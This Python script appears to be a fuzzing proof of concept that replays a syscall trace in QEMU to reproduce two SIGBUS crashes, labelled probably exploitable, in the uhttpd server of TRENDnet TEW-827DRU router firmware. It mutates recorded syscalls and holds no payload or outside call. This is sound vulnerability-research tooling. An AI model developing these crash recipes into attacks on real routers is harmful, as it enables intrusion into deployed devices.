#!/usr/bin/env python3
"""
poc_tew827.py — PoC for NB-TEW827-01 and NB-TEW827-02

Target: TRENDnet TEW-827DRU uhttpd POST handler (MIPS-LE)

NB-TEW827-01 (d0de57e2):
  Signal: SIGBUS(7)  PC: 0x2b2b0f00 (uhttpd lib)
  Trigger: interesting_value at idx=1126 (write fd=8 after POST)
           + boundary_value at idx=1118/1151
           + file_fd_retval at idx=1131/1137/1146 (mixed-FD trigger)

NB-TEW827-02 (e4196d86):
  Signal: SIGBUS(7)  PC: 0x2b2b0f7c (uhttpd lib)
  Trigger: overwrite_offset at idx=1153/1158 (write fd=8)
           + extend at idx=1115
           + dictionary_token at idx=1126
           + file_fd_retval at idx=1125/1134/1143/1149 (mixed-FD trigger)

Both require mixed-FD mutations (network + file FD) — classified PROBABLY-EXPLOITABLE.

Trace: tests/seeds/Trendnet_TEW827_post.trace (1627 syscalls)
  accept@1096(first conn), accept@1112(POST conn), read(fd=8)@1122(190B)
  fork_point=1112

Usage:
  cd rr_fuzzing/fuzzing
  python3 ../tests/scripts/fuzzing/poc_tew827.py [d0de57e2|e4196d86] [--max-rounds N] [--gdb]

GDB (with --gdb):
  gdb-multiarch tests/verified_targets/Trendnet_TEW827DRU/rootfs/usr/sbin/uhttpd
  (gdb) set architecture mips
  (gdb) target remote :9998
  (gdb) continue
  # On SIGBUS: info registers; bt; x/10i $pc-16; info symbol $pc
"""
import sys, argparse
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT / 'fuzzing'))

from conductor.qemu_executor import QEMUExecutor
from conductor.conductor_types import FuzzInstruction

ROOTFS     = str(ROOT / 'tests/verified_targets/Trendnet_TEW827DRU/rootfs')
BUILD      = str(ROOT / '../../build')
BINARY     = f'{ROOTFS}/usr/sbin/uhttpd'
TRACE      = str(ROOT / 'tests/seeds/Trendnet_TEW827_post.trace')
FORK_POINT = 1112
GDB_PORT   = 9998

# NB-TEW827-01: SIGBUS at 0x2b2b0f00
# Recipe from crash_w0_000013_d0de57e2 (tew827_post campaign)
MUTATIONS_D0DE57E2 = [
    # Network-FD mutations (fd=8, post-accept@1112)
    FuzzInstruction(syscall_index=1126, cmd=9, arg_index=1,
                    data=b'\xff\xff\xff\xff\x00\x00\x00\x00', offset=0, size=8,
                    mutation_type='interesting_value'),
    FuzzInstruction(syscall_index=1118, cmd=4, arg_index=1,
                    data=b'\x00\x00\x00\x00\x00\x00\x00\x00', offset=0, size=8,
                    mutation_type='boundary_value'),
    FuzzInstruction(syscall_index=1151, cmd=4, arg_index=1,
                    data=b'\xff\xff\xff\xff\xff\xff\xff\xff', offset=0, size=8,
                    mutation_type='boundary_value'),
    FuzzInstruction(syscall_index=1155, cmd=2, arg_index=1,
                    data=b'GLIBC_2.0', offset=0, size=9,
                    mutation_type='dictionary_aux'),
    FuzzInstruction(syscall_index=1161, cmd=10, arg_index=1,
                    data=b'\x02\x00\x00\x00', offset=0, size=4,
                    mutation_type='light_mutation'),
    # File-FD mutations (mixed trigger — idx=1131/1137/1146 are file ops after POST)
    FuzzInstruction(syscall_index=1131, cmd=1, arg_index=255,
                    data=b'\x01\x00\x00\x00\x00\x00\x00\x00', offset=0, size=8,
                    mutation_type='file_fd_retval'),
    FuzzInstruction(syscall_index=1137, cmd=1, arg_index=255,
                    data=b'\x04\x00\x00\x00\x00\x00\x00\x00', offset=0, size=8,
                    mutation_type='file_fd_retval'),
    FuzzInstruction(syscall_index=1146, cmd=1, arg_index=255,
                    data=b'\x00\x00\x00\x00\x00\x00\x00\x00', offset=0, size=8,
                    mutation_type='file_fd_retval'),
]

# NB-TEW827-02: SIGBUS at 0x2b2b0f7c
# Recipe from crash_w0_000393_e4196d86 (tew827_post campaign)
MUTATIONS_E4196D86 = [
    # Network-FD mutations
    FuzzInstruction(syscall_index=1126, cmd=2, arg_index=1,
                    data=b'OPTIONS', offset=0, size=7,
                    mutation_type='dictionary_token'),
    FuzzInstruction(syscall_index=1115, cmd=8, arg_index=1,
                    data=b'\x01\x00\x00\x00', offset=0, size=4,
                    mutation_type='extend'),
    FuzzInstruction(syscall_index=1153, cmd=11, arg_index=1,
                    data=b'\x07\xed', offset=0, size=2,
                    mutation_type='overwrite_offset'),
    FuzzInstruction(syscall_index=1158, cmd=11, arg_index=1,
                    data=b'\x03\x17', offset=0, size=2,
                    mutation_type='overwrite_offset'),
    # File-FD mutations (mixed trigger)
    FuzzInstruction(syscall_index=1125, cmd=1, arg_index=255,
                    data=b'\xfe\xff\xff\xff\xff\xff\xff\xff', offset=0, size=8,
                    mutation_type='file_fd_retval'),
    FuzzInstruction(syscall_index=1134, cmd=1, arg_index=255,
                    data=b'\xfb\xff\xff\xff\xff\xff\xff\xff', offset=0, size=8,
                    mutation_type='file_fd_retval'),
    FuzzInstruction(syscall_index=1143, cmd=1, arg_index=255,
                    data=b'\xfe\xff\xff\xff\xff\xff\xff\xff', offset=0, size=8,
                    mutation_type='file_fd_retval'),
    FuzzInstruction(syscall_index=1149, cmd=1, arg_index=255,
                    data=b'\x04\x00\x00\x00\x00\x00\x00\x00', offset=0, size=8,
                    mutation_type='file_fd_retval'),
]

VARIANTS = {
    'd0de57e2': (MUTATIONS_D0DE57E2, 0x2b2b0f00, 'NB-TEW827-01'),
    'e4196d86': (MUTATIONS_E4196D86, 0x2b2b0f7c, 'NB-TEW827-02'),
}


def run_poc(variant_hash: str, max_rounds: int, gdb_mode: bool):
    mutations, expected_pc, label = VARIANTS[variant_hash]
    extra_args = ['-g', str(GDB_PORT)] if gdb_mode else []

    if gdb_mode:
        print(f'\nConnect GDB:')
        print(f'  gdb-multiarch {BINARY}')
        print(f'  (gdb) set architecture mips')
        print(f'  (gdb) target remote :{GDB_PORT}')
        print(f'  (gdb) continue\n')

    executor = QEMUExecutor(
        qemu_path=f'{BUILD}/qemu-mipsel',
        target_binary=BINARY,
        ld_prefix=ROOTFS,
        timeout=20.0,
        extra_qemu_args=extra_args,
    )

    print(f'[*] {label} PoC ({variant_hash})')
    print(f'[*] Target     : {BINARY}')
    print(f'[*] Trace      : {TRACE}')
    print(f'[*] fork_point : {FORK_POINT}')
    print(f'[*] Expected PC: {hex(expected_pc)}')
    print(f'[*] Mutations  : {len(mutations)} ({sum(1 for m in mutations if m.mutation_type=="file_fd_retval")} file_fd_retval)')
    print()

    found = False
    for rnd in range(1, max_rounds + 1):
        results = executor.execute_fork(
            trace_file=TRACE,
            fork_point=FORK_POINT,
            mutation_variants=[mutations],
            depth=0,
            iteration_id=rnd,
        )

        if not results:
            if rnd % 50 == 0:
                print(f'  round {rnd:4d}: no result')
            continue

        r = results[0]
        crashed = getattr(r, 'crashed', False)
        sig     = getattr(r, 'signal_number', None)
        pc      = hex(getattr(r, 'pc', 0) or 0)

        if crashed:
            print(f'  round {rnd:4d}: *** CRASH ***  pc={pc}  signal={sig}')
            found = True
            break
        elif rnd % 50 == 0:
            print(f'  round {rnd:4d}: {getattr(r, "status_name", "ok")}')

    executor.stop_persistent_qemu()

    print()
    if found:
        print(f'★ {label} CONFIRMED: pc={pc}  signal={sig}')
        print(f'  SIGBUS in uhttpd lib — mixed-FD trigger (network+file)')
    else:
        print(f'✗ Not reproduced in {max_rounds} rounds')
        print(f'  Note: mixed-FD crash may need more rounds or specific heap state.')
    return found


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('variant', nargs='?', default='d0de57e2',
                    choices=list(VARIANTS.keys()))
    ap.add_argument('--max-rounds', type=int, default=200)
    ap.add_argument('--gdb',        action='store_true')
    args = ap.parse_args()
    run_poc(args.variant, args.max_rounds, args.gdb)


if __name__ == '__main__':
    main()
